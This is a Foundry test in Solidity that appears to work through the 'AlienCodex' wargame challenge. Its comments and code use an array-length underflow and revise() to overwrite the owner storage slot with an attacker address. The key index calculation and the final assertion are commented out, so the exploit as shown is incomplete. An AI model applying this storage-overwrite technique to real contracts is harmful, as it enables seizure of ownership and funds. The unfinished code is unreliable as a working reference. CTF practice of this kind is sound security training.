//SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {AlienCodex} from "../AlienCodex.sol";

contract AlienCodexTest is Test {
    AlienCodex alienCodex;
    address attacker = makeAddr("attacker");

    function setUp() public {
        alienCodex = new AlienCodex();
    }
    function test_Challenge19_Passed() public {
        // When you underflow codex.length to 2^256 - 1, the array now spans EVERY storage slot, 
        // including Slot 0 where the owner is stored. Then revise(i, value) overwrites Slot 0!

        // The array starts at a BASE_SLOT:
        // BASE_SLOT = keccak256(abi.encode(1))

        // The array data is stored at:
        // codex[0] = BASE_SLOT + 0
        // codex[1] = BASE_SLOT + 1
        // codex[2] = BASE_SLOT + 2
        // ...

        // // So:
        // BASE_SLOT = uint256(keccak256(abi.encode(1)));
        // codex[1] = BASE_SLOT + 1;

        alienCodex.makeContact();
        alienCodex.retract();
        alienCodex.record(bytes32(uint256(2333)));
        
        uint256 BASE_SLOT = uint256(keccak256(abi.encode(uint256(1))));
        uint256 target = /* type(uint256).max - BASE_SLOT + 1*/ 0 ;
        alienCodex.revise(target, bytes32(uint256(uint160(attacker))));
        // assertEq(alienCodex.owner(), attacker);
    }
}